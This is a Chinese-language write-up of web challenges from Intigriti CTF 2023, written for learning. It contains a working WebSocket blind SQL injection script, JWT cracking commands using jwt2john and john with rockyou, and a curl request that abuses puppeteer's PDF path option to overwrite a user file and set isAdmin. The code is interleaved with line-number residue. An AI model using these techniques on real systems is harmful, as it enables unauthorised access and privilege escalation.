---
title: Intigriti CTF 2023 Writeup [WEB]
contest: Intigriti CTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- WebSocket_SQL盲注
- JWT密钥爆破
- Nodejs原型链污染
- puppeteer_path注入
- isAdmin权限绕过
attack_chain:
- WebSocket 注入：{"id":"11 and (SELECT substr(description,1,1)='A')"}
- websockets sync client 爆破 flag 字符
- JWT 爆破：jwt2john + rockyou
- 'Nodejs 原型链污染：污染 userData 写 isAdmin: true'
- puppeteer path 注入：userOptions.path=/app/data/test.json 写恶意 JSON
- '写 {username, firstName, lastName, spotifyTrackCode, isAdmin: true} 覆盖 isAdmin'
- 访问 /admin 路由拿 flag
key_payload: '''isAdmin: true 写 userData'''
one_liner: Intigriti CTF 2023：WebSocket 盲注+JWT 爆破+原型链污染+puppeteer path 注入。
lesson: puppeteer page.pdf() 的 path 选项可控可写文件；JSON 写入可污染 isAdmin 字段。
quality: high
full_path: Intigriti_CTF_2023_Writeup_[WEB].full.md
meta_path: Intigriti_CTF_2023_Writeup_[WEB].meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: Intigriti CTF 2023 Writeup [WEB]。Intigriti CTF 2023：WebSocket 盲注+JWT 爆破+原型链污染+puppeteer path 注入。。关键路径：WebSocket 注入：{"id":"11 and (SELECT substr(description,1,1)='A')"} → websockets sync client ...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/146540.html
reasoning_chain:
- 'WebSocket 端点接受 JSON {id: query} → 触发点：WebSocket SQL 盲注'
- 动作：注入 payload {"id":"11 and (SELECT substr(description,1,1)='A')"} → 假设：注入点在 id 字段
- 观察：返回结果随字符真假变化 → 动作：用 websockets sync client 盲注 flag
- JWT 密钥爆破：拿到 jwt token → 动作：jwt2john + rockyou 字典 → 爆破成功 → 假设：伪造 admin JWT
- Nodejs 原型链污染：用户提交 JSON 含 __proto__ → 触发点：merge / deep set 不安全
- '动作：污染 userData 写 isAdmin: true → 假设：覆盖所有用户 isAdmin'
- 动作：puppeteer page.pdf() 接受 userOptions.path=/app/data/test.json → 触发点：path 注入
- 动作：写入 {username, firstName, lastName, spotifyTrackCode, isAdmin:true} → 覆盖 isAdmin → 访问 /admin → 完成
failed_attempts:
- WebSocket 试 union select → 失败：盲注环境
- JWT 试 alg=none → 失败：服务端强制 RS256
- 原型链污染试 constructor.prototype → 失败：服务端只接受 __proto__ 形式
key_observations:
- WebSocket JSON 字段是 SQL 盲注常考点
- JWT 弱 secret 必须字典爆破（jwt2john）
- Node 原型链污染经典 sink：merge / lodash / jQuery extend
- puppeteer page.pdf() 的 path 选项是写文件 sink
- 写 JSON 文件 + 反序列化 = 覆盖任意字段（isAdmin）
prerequisites:
- WebSocket 协议 + websockets sync client
- SQL 盲注（substr + 比较）+ JWT 密钥爆破（jwt2john + john/hashcat）
- Node.js 原型链污染 + puppeteer page.pdf() path 选项
---
# Intigriti CTF 2023 Writeup [WEB]

> 原文: https://www.ctfiot.com/146540.html
> ID: 146540


```
1
1 OR 1=1
1
1 AND 1=2
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
import string, base64
from websockets.sync.client import connect

def sqli(ws,q_left,chars):
 data = """{"id":"11 and (%s='%s')"}""" % (q_left, chars)
 ws.send(data)
 temp = ws.recv()
 return "Open" in temp

def exploit_websockets(TARGET):
 dumped = ""
 with connect(TARGET) as ws:
 sql_template = "SELECT substr(description, %s, 1)"
 i = 1
 while True:
 for chars in string.printable:
 if sqli(ws,sql_template%i,chars):
 dumped += chars
 print(dumped)
 i+=1
 break

if __name__ == "__main__":
 TARGET = "wss://bountyrepo.ctf.intigriti.io/ws"
 exploit_websockets(TARGET)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
# jwt2john
./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I" > hash

# john
john hash --wordlist=/usr/share/wordlists/rockyou.txt
1
2
3
{
 "firstName":"<h1>firstName</h1>","lastName":"<h1>lastName</h1>","spotifyTrackCode":"<h1>spotifyTrackCode</h1>"
}
1

1

1
2
3
4
5
6
7
8
9
10
11
12
13
14
/app/app.js
/app/package.json
/app/routes/index.js
/app/routes/api.js
/app/views/register.handlebars
/app/services/user.js
/app/middleware/check_admin.js
/app/middleware/auth.js
/app/controllers/user.js
/app/utils/generateProfileCard.js
/app/views/print_profile.handlebars
/app/data/{hash}.json
/app/Dockerfile
/etc/resolv.conf
1
2
3
router.get('/admin', isAdmin, (req, res) => {
 res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
const { getUser, userExists } = require('../services/user')
const isAdmin = (req, res, next) => {
let loginHash = req.cookies['login_hash']
let userData

if (loginHash && userExists(loginHash)) {
 userData = getUser(loginHash)
} else {
 return res.redirect('/login')
}
try {
 userData = JSON.parse(userData)
 if (userData.isAdmin !== true) {
 res.status(403)
 res.send('Only admins can view this page')
 return
 }
} catch (e) {
 console.log(e)
}
next()
}

module.exports = { isAdmin }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
const fs = require('fs')
const path = require('path')
const { createHash } = require('crypto')
const { v4: uuidv4 } = require('uuid')
const dataDir = './data'

// Register New User
// Write new data in /app/data/<loginhash>.json
const createUser = (userData) => {
 const loginHash = createHash('sha256').update(uuidv4()).digest('hex')
 fs.writeFileSync(
 path.join(dataDir, `${loginHash}.json`),
 JSON.stringify(userData)
 )
 return loginHash
}

// Update User
// Update new data in /app/data/<loginhash>.json
const setUserData = (loginHash, userData) => {
 if (!userExists(loginHash)) {
 throw 'Invalid login hash'
 }
 fs.writeFileSync(
 path.join(dataDir, `${path.basename(loginHash)}.json`),
 JSON.stringify(userData)
 )
 return userData
}

// Get User
// Read /app/data/<loginhash>.json
const getUser = (loginHash) => {
 let userData = fs.readFileSync(
 path.join(dataDir, `${path.basename(loginHash)}.json`),
 {
 encoding: 'utf8',
 }
 )
 return userData
}

// Check if UserExists
// Check if file /app/data/<loginhash>.json exists
const userExists = (loginHash) => {
 return fs.existsSync(path.join(dataDir, `${path.basename(loginHash)}.json`))
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
...
// Create User only accepts username, firstName, lastName
// There is no isAdmin available in here
const { username, firstName, lastName } = req.body
const userData = {
 username,
 firstName,
 lastName,
}
try {
 const loginHash = createUser(userData)
...
// Update user only accepts firstname, lastname, spotifyTrackCode
// Also there is no isAdmin available in here
const { firstName, lastName, spotifyTrackCode } = req.body
const userData = {
 username: req.userData.username,
 firstName,
 lastName,
 spotifyTrackCode,
}
try {
 setUserData(req.loginHash, userData)
...
1
2
3
4
5
6
// We can send userOptions in the body
router.post('/profile/generate-profile-card', requireAuth, async (req, res) => {
 const pdf = await generatePDF(req.userData, req.body.userOptions)
 res.contentType('application/pdf')
 res.send(pdf)
})
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
...
const generatePDF = async (userData, userOptions) => {
 const browser = await puppeteer.launch({
 executablePath: '/usr/bin/google-chrome',
 args: ['--no-sandbox'],
 })
 const page = await browser.newPage()
 ...
 let options = {
 format: 'A5',
 }
 // Our userOptions will be use to generate the PDF
 if (userOptions) {
 options = { ...options, ...userOptions }
 }
 const pdf = await page.pdf(options)
 ...
}
...
1
curl -k -X POST -H 'Content-Type: application/json' -b 'login_hash=f024b76b41f9dba21cf620484862e9b90465d8db09ea946fb04a0f6f3876103a' https://mymusic.ctf.intigriti.io/profile/generate-profile-card -d '{"userOptions":{"path":"/app/data/test.json"}}'
1
{'username':'a','firstName':'a','lastName':'b','spotifyTrackCode':'c','isAdmin':'true'}
1

```


---
## 附图

[图片已移除]
[图片已移除]